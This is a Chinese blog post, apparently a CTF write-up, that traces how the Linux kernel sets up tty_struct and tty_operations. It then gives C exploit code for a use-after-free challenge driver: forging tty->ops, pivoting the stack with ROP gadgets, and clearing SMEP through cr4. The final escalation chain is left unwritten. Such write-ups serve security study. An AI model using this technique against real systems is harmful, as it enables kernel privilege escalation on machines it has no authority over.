---
title: kernel tty_struct
date: 2022-02-13 16:44:53
permalink: /pages/9ab61d/
categories:
  - ctf_wp
  - kernel
tags:
  - 
---
# kernel tty_struct exp 

[[toc]]

## tty_struct 

Linux下一个特殊的驱动文件，是默认集成在linux中的， 代码在`driver/tty`文件夹。主要文件在 `pty.c`， 

### ptmx

可以看到其对应的 `file_operations`结构，定义为`ptmx_fops`， 

然后可以看到对应的`__init`函数，驱动载入的初始化代码在 `unix98_pty_init`函数， 

![image-20220213185023138](https://s2.loli.net/2022/02/13/WzgQPvNn5L7Mofi.png)

在此函数最后， 设置了文件 `"/dev/ptmx"`， 

![image-20220213184120686](https://s2.loli.net/2022/02/13/FiWT3E8YnXSvkVl.png)

在这里也可以看到我们的`ptmx_fops.open`被设置为了 `ptmx_open`函数，
### 定义

我们的主角: `struct tty_struct`结构体定义在 `include/linux/tty.h`， 

其实唯一需要注意的是第四位的`ops`: `const struct tty_operations *ops;`， 

```c
struct tty_struct {
        int     magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;

        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;

        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;        /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;               /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;         /* winsize_mutex */
        unsigned long stopped:1,        /* flow_lock */
                      flow_stopped:1,
                      unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                      packet:1,
                      unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;      /* Bytes free for queue */
        int flow_change;

        struct tty_struct *link;
        struct fasync_struct *fasync;
        int alt_speed;          /* For magic substitution of 38400 bps */
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
};
```

这个`tty_operations`定义在`include/linux/tty_driver.h`,  可以看到 大量的hook位。

```c 
struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                        struct inode *inode, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                      const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                    unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                             unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                        unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                                struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
        const struct file_operations *proc_fops;
};
```


### `tty->ops`

这个函数定义了tty结构， 然后后续基本就是对这个结构体进行相关的设置， 但是后续没有对tty->ops的设置，应该是在函数`tty_init_dev`内，

![image-20220213185357205](https://s2.loli.net/2022/02/13/OFVpPUEqC47KaIm.png)

这个函数定义在`drivers/tty/tty_io.c`， 仍然是调用`alloc_tty_struct`函数后简单设置返回，

![image-20220213185737733](https://s2.loli.net/2022/02/13/OEix8uDhS4M2W7c.png)

继续跟进，终于在这个函数内发现了设置ops的位置，但是这是通过driver进行赋值的，

![image-20220213185827868](https://s2.loli.net/2022/02/13/nGY7UL83Bl26SJF.png)

向上回溯，在`ptmx_open`发现传入的这个参数， 

![image-20220213185958256](https://s2.loli.net/2022/02/13/agnLidZ6YAXvTFq.png)

这是个全局变量， 在初始化函数就进行了定义。

![image-20220213183917852](https://s2.loli.net/2022/02/13/67nA8uT2SgkjYPR.png)

跟进发现`tty_allo_driver`中并没有设置`driver->ops`的位置，

在文件 `driver/tty/tty_io.c`中的这里设置ops， 

```c
void tty_set_operations(struct tty_driver *driver,
                        const struct tty_operations *op)
{
        driver->ops = op;
};
EXPORT_SYMBOL(tty_set_operations);
```

在`init unix98_pty_init`函数中的后面进行设置，这个量是一个静态变量。

![image-20220213194315787](https://s2.loli.net/2022/02/13/WN92BHvjlyeufUA.png)

![image-20220213194323781](https://s2.loli.net/2022/02/13/2cRdpEbBMHiGuNf.png)

![image-20220213202641028](https://s2.loli.net/2022/02/13/QOhE3tD2wuxXsFa.png)

### 利用

通过上面的运行流， 我们没有办法直接伪造`tty_operations`结构体，但是可以伪造 `tty_struct`结构体，然后将`tty->ops`指向我们伪造的位置即可。

### write 执行流

wirte函数会转入驱动设置好的函数，这里由tty_write接收，  

![image-20220213202556428](https://s2.loli.net/2022/02/13/izGHMvr197EVT8s.png)

```c
static ssize_t tty_write(struct file *file, const char __user *buf,
						size_t count, loff_t *ppos)
{
	struct tty_struct *tty = file_tty(file);
 	struct tty_ldisc *ld;
	ssize_t ret;

	if (tty_paranoia_check(tty, file_inode(file), "tty_write"))
		return -EIO;
	if (!tty || !tty->ops->write ||
		(test_bit(TTY_IO_ERROR, &tty->flags)))
			return -EIO;
	/* Short term debug to catch buggy drivers */
	if (tty->ops->write_room == NULL)
		printk(KERN_ERR "tty driver %s lacks a write_room method.\n",
			tty->driver->name);
	ld = tty_ldisc_ref_wait(tty);
	if (!ld->ops->write)
		ret = -EIO;
	else
		ret = do_tty_write(ld->ops->write, tty, file, buf, count);
	tty_ldisc_deref(ld);
	return ret;
}
```

基本会直接进入`do_tty_write`这个函数， 其中这个`ld->ops->write`如下：

![image-20220213203445700](https://s2.loli.net/2022/02/13/43af1o58nbvSmCB.png)

`do_tty_write`这个函数定义如下， 但是是`inline`定义，在调试时是被编译进了`tty_write`函数内，

![image-20220213204018849](https://s2.loli.net/2022/02/13/opmQW82uTDOEMcR.png)

我们直接在`ld->ops->write`下断点即可。

```c
/*
 * Split writes up in sane blocksizes to avoid
 * denial-of-service type attacks
 */
static inline ssize_t do_tty_write(
	ssize_t (*write)(struct tty_struct *, struct file *, const unsigned char *, size_t),
	struct tty_struct *tty,
	struct file *file,
	const char __user *buf,
	size_t count)
{
	ssize_t ret, written = 0;
	unsigned int chunk;

	ret = tty_write_lock(tty, file->f_flags & O_NDELAY);
	if (ret < 0)
		return ret;

	/*
	 * We chunk up writes into a temporary buffer. This
	 * simplifies low-level drivers immensely, since they
	 * don't have locking issues and user mode accesses.
	 *
	 * But if TTY_NO_WRITE_SPLIT is set, we should use a
	 * big chunk-size..
	 *
	 * The default chunk-size is 2kB, because the NTTY
	 * layer has problems with bigger chunks. It will
	 * claim to be able to handle more characters than
	 * it actually does.
	 *
	 * FIXME: This can probably go away now except that 64K chunks
	 * are too likely to fail unless switched to vmalloc...
	 */
	chunk = 2048;
	if (test_bit(TTY_NO_WRITE_SPLIT, &tty->flags))
		chunk = 65536;
	if (count < chunk)
		chunk = count;

	/* write_buf/write_cnt is protected by the atomic_write_lock mutex */
	if (tty->write_cnt < chunk) {
		unsigned char *buf_chunk;

		if (chunk < 1024)
			chunk = 1024;

		buf_chunk = kmalloc(chunk, GFP_KERNEL);
		if (!buf_chunk) {
			ret = -ENOMEM;
			goto out;
		}
		kfree(tty->write_buf);
		tty->write_cnt = chunk;
		tty->write_buf = buf_chunk;
	}

	/* Do the write .. */
	for (;;) {
		size_t size = count;
		if (size > chunk)
			size = chunk;
		ret = -EFAULT;
		if (copy_from_user(tty->write_buf, buf, size))
			break;
		ret = write(tty, file, tty->write_buf, size);
		if (ret <= 0)
			break;
		written += ret;
		buf += ret;
		count -= ret;
		if (!count)
			break;
		ret = -ERESTARTSYS;
		if (signal_pending(current))
			break;
		cond_resched();
	}
	if (written) {
		tty_update_time(&file_inode(file)->i_mtime);
		ret = written;
	}
out:
	tty_write_unlock(tty);
	return ret;
}
```

这个`n_tty_write`定义在`driver/tty/n_tty.c`, 

```c
static ssize_t n_tty_write(struct tty_struct *tty, struct file *file,
			   const unsigned char *buf, size_t nr)
{
	const unsigned char *b = buf;
	DEFINE_WAIT_FUNC(wait, woken_wake_function);
	int c;
	ssize_t retval = 0;

	/* Job control check -- must be done at start (POSIX.1 7.1.1.4). */
	if (L_TOSTOP(tty) && file->f_op->write != redirected_tty_write) {
		retval = tty_check_change(tty);
		if (retval)
			return retval;
	}

	down_read(&tty->termios_rwsem);

	/* Write out any echoed characters that are still pending */
	process_echoes(tty);

	add_wait_queue(&tty->write_wait, &wait);
	while (1) {
		if (signal_pending(current)) {
			retval = -ERESTARTSYS;
			break;
		}
		if (tty_hung_up_p(file) || (tty->link && !tty->link->count)) {
			retval = -EIO;
			break;
		}
		if (O_OPOST(tty)) {
			while (nr > 0) {
				ssize_t num = process_output_block(tty, b, nr);
				if (num < 0) {
					if (num == -EAGAIN)
						break;
					retval = num;
					goto break_out;
				}
				b += num;
				nr -= num;
				if (nr == 0)
					break;
				c = *b;
				if (process_output(c, tty) < 0)
					break;
				b++; nr--;
			}
			if (tty->ops->flush_chars)
				tty->ops->flush_chars(tty);
		} else {
			struct n_tty_data *ldata = tty->disc_data;

			while (nr > 0) {
				mutex_lock(&ldata->output_lock);
				c = tty->ops->write(tty, b, nr);
				mutex_unlock(&ldata->output_lock);
				if (c < 0) {
					retval = c;
					goto break_out;
				}
				if (!c)
					break;
				b += c;
				nr -= c;
			}
		}
		if (!nr)
			break;
		if (file->f_flags & O_NONBLOCK) {
			retval = -EAGAIN;
			break;
		}
		up_read(&tty->termios_rwsem);

		wait_woken(&wait, TASK_INTERRUPTIBLE, MAX_SCHEDULE_TIMEOUT);

		down_read(&tty->termios_rwsem);
	}
break_out:
	remove_wait_queue(&tty->write_wait, &wait);
	if (b - buf != nr && tty->fasync)
		set_bit(TTY_DO_WRITE_WAKEUP, &tty->flags);
	up_read(&tty->termios_rwsem);
	return (b - buf) ? b - buf : retval;
}
```

可以看到这里关于`tty->ops`的使用只有两个位置: 

![image-20220213205035210](https://s2.loli.net/2022/02/13/SR9zNTde2fKXCPk.png)

另一个是 `tty->ops->write(tty, b, nr);`， 

两个不能同时触发， 判断条件为， `if (O_OPOST(tty)) {`， 可以在`include/linux/tty.h`找到这个宏的相关定义。对应的数据在偏移0x130的位置。

![image-20220213211420121](https://s2.loli.net/2022/02/13/1kJg7O2PxpsCS9z.png)

![image-20220213211727549](https://s2.loli.net/2022/02/13/eIPCNgsnX6mz7Hp.png)

奇怪的是我使用以下的exp进行调试的过程中发现这个值并不会被改变，一直进入`tty->ops->flush_chars`。

```c
#include <stdio.h>
#include <fcntl.h>

int main(){
    int fd1 = open("/dev/ptmx", O_RDWR);
    if(fd1 < 0){
        printf("open error\n");
        exit(-1);
    }
    write(fd1, "1234", 4);
    return 0;
}
```

但是在实际的题目调试中可以看到另一个调用 `tty->ops->write`

![image-20220213221845304](https://s2.loli.net/2022/02/13/SacWkZd2vUBhY3M.png)

然后这里是我们要利用的位置偏移(这是到这个位置 还得再加一个指针就是覆盖)，和对应的内存

![image-20220213214838032](https://s2.loli.net/2022/02/13/Y4SVI6GWZsrxLmJ.png)

![image-20220213214915795](https://s2.loli.net/2022/02/13/uLVzITeGmoJWhai.png)

## 利用

仍然是之前那个uaf的题目， 这次尝试使用这个`tty_struct`， 

### Fake_ops

和上个解法一样，open open ioctl close ， 然后open("ptmx") 可以得到`tty_struct`的地址，我们先read将数据读取，然后只修改`tty->ops`位置，修改到我们程序内的地址上, 

然后做一个伪造的ops结构体，其中的每个函数都写为 `0xffffffff81110c15: ret`地址, 第八个是write， 修改为随意一个地址进行测试。

```c

typedef unsigned long long  uint64;

void * fake_ops[0x34];

int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    if (fd1<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd2<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    ioctl(fd1, 0x10001, 0x2e0);
    printf("set chunk size = 0x2e0 = sizeof(struct tty_struct)\n");
    close(fd1);
    //printf("close fd1, free chunk\n");

    int tty = open("/dev/ptmx", O_RDWR);
    if(tty<0){
        printf("open /dev/ptmx error\n");
        exit(-1);
    }

    for (int i=0; i<0x34; i++){
        fake_ops[i] = 0xffffffff81110c15;
    }

    fake_ops[7] = 0x12345678;


    uint64 fake_tty[4];
    read(fd2, fake_tty, 0x20);
    fake_tty[3] = (uint64)fake_ops;

    write(fd2, fake_tty, 0x20);

    char buf[0x8] = {0};
    write(tty, buf, 0x8);

    return 0;
}
```

成功

![image-20220213224755651](https://s2.loli.net/2022/02/13/unU6QzoLwvTiI4H.png)

![image-20220213225125928](https://s2.loli.net/2022/02/13/eyWcqQgOZ3BL8M5.png)

### fake_stack 

我们继续审视下这个程序崩溃的位置

![image-20220213225444461](https://s2.loli.net/2022/02/13/KMg21iAuQZD9rGj.png)

首先我们可以控制rip运行到这里， 寄存器中， 我们只能控制rax， 接下来的构造， 

* 这个rip如果调用函数的话，在一次函数调用内进行提权肯定是不可能的。
* 这个rip进行rop的话，可以配合rax修改rsp， 

搜索，确实存在这个gadget， 

![image-20220213230213987](https://s2.loli.net/2022/02/13/TtrfaneBqCl1LXP.png)

那么rsp就来到了我们的rax， 即fake_ops中，在这里在进行一次栈迁移， 

这里选择了一个最短的rop放在fake_ops，

![image-20220213230532147](https://s2.loli.net/2022/02/13/vPK9pV4jwNseMAE.png)

```c
    // fake_ops
    for (int i=0; i<0x34; i++){
        fake_ops[i] = 0xffffffff81110c15; // ret;
    }

    fake_ops[0] = 0xffffffff8100202b;// pop rbp; ret;
    fake_ops[1] = rop;
    fake_ops[2] = 0xffffffff81002e44; // leave; ret;

    // ops->write 
    fake_ops[7] = 0xffffffff8181bfc5; // mov rax, rsp; dec ebx; ret;
```

调试可以看到， 成功， 注意栈内数据两次变化。

![image-20220213230850063](https://s2.loli.net/2022/02/13/jKknC3T8XMbwd2E.png)

![image-20220213230935507](https://s2.loli.net/2022/02/13/jbMqSplKvNHQIAU.png)

于是我们可以写rop了。

### kernel rop

这一部分如果全内核态rop提权，然后返回用户态的话其实和之前的kernel rop的文章一致。 

但是这个题目还有smep保护，这个保护不允许内核态执行用户态的代码。可以使用完全在内核态的rop来绕过。但是这个保护的开启表示在 cr4寄存器的第20位， 我们可以直接修改cr4寄存器关闭这个保护。然后就和之前的kernel rop两个手段都ok了。

我们先看下开启和不开启smep的两种cr4 

![image-20220213233246365](https://s2.loli.net/2022/02/13/zb7KFJ1PfdZYQar.png)

![image-20220213233253285](https://s2.loli.net/2022/02/13/FtlJ42b6vVCndo9.png)

其实就改为0x6f0即可。

![image-20220213233430308](https://s2.loli.net/2022/02/13/HSKflcqMEF6p3mz.png)

修改成功，后续利用就和kernel rop一样了。

![image-20220213233945772](https://s2.loli.net/2022/02/13/mGVFw4CIahLNKnx.png)

```c
    // rop 
    int i = 0;
    rop[i++] = 0; 
    rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;

```

### exp

```
#include <stdio.h>
#include <fcntl.h>

typedef unsigned long long  uint64;

void * fake_ops[0x34];
void * rop[0x100];

int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    if (fd1<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd2<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    ioctl(fd1, 0x10001, 0x2e0);
    printf("set chunk size = 0x2e0 = sizeof(struct tty_struct)\n");
    close(fd1);
    //printf("close fd1, free chunk\n");

    int tty = open("/dev/ptmx", O_RDWR);
    if(tty<0){
        printf("open /dev/ptmx error\n");
        exit(-1);
    }

    // rop 
    int i = 0;
    rop[i++] = 0; 
    rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;
		
		// rop => 提权 和kernel rop一样， 不写了

    // fake_ops
    for (int i=0; i<0x34; i++){
        fake_ops[i] = 0xffffffff81110c15; // ret;
    }

    fake_ops[0] = 0xffffffff8100202b;// pop rbp; ret;
    fake_ops[1] = rop;
    fake_ops[2] = 0xffffffff81002e44; // leave; ret;

    // ops->write 
    fake_ops[7] = 0xffffffff8181bfc5; // mov rax, rsp; dec ebx; ret;


    uint64 fake_tty[4];
    read(fd2, fake_tty, 0x20);
    // tty->ops
    fake_tty[3] = (uint64)fake_ops;
    write(fd2, fake_tty, 0x20);

    char buf[0x8] = {0};
    write(tty, buf, 0x8);

    return 0;
}

```

